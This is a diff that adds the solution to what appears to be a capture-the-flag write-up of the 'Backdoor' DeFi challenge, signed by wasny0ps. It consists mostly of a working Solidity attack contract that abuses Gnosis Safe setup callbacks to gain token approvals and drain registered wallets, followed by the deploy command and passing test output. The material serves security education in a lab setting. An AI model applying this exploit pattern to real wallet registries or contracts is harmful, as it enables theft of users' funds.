@@ -168,3 +168,62 @@ Your goal is to take all funds from the registry. In a single transaction.
 
 # Subverting
 
+```solidity
+pragma solidity ^0.8.0;
+
+import "../backdoor/WalletRegistry.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
+contract Callback {
+    function callback(address token, address spender, uint256 drainAmount) external {
+        IERC20(token).approve(spender, drainAmount);
+    }
+}
+
+
+contract AttackBackdoor {
+    constructor(address[] memory _users,address _walletRegistry ) {
+
+        Callback callback = new Callback();
+        WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);
+        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
+        IERC20 token = walletRegistry.token();
+
+        for (uint i = 0; i < _users.length;) {       
+            address[] memory owners = new address[](1);
+            owners[0] = _users[i];
+            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1, address(callback), abi.encodeWithSelector(Callback.callback.selector, address(token), address(this), 10e18),address(0), address(0), 0, address(0));
+            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(walletRegistry.masterCopy(),init, i,IProxyCreationCallback(_walletRegistry));
+            require(token.allowance(address(safeProxy), address(this)) == 10e18);
+            token.transferFrom(address(safeProxy), msg.sender, 10e18);
+            unchecked{++i;}
+        }
+    }
+}
+```
+
+Here is the attacker command:
+
+```js
+await (await ethers.getContractFactory('AttackBackdoor', player)).deploy(
+            users, walletRegistry.address, {gasLimit: 30000000}
+);
+```
+
+Solve the challenge.
+
+```powershell
+
+  [Challenge] Backdoor
+    ✔ Execution (375ms)
+
+
+  1 passing (4s)
+
+Done in 6.34s.
+```
+
+**_by wasny0ps_**
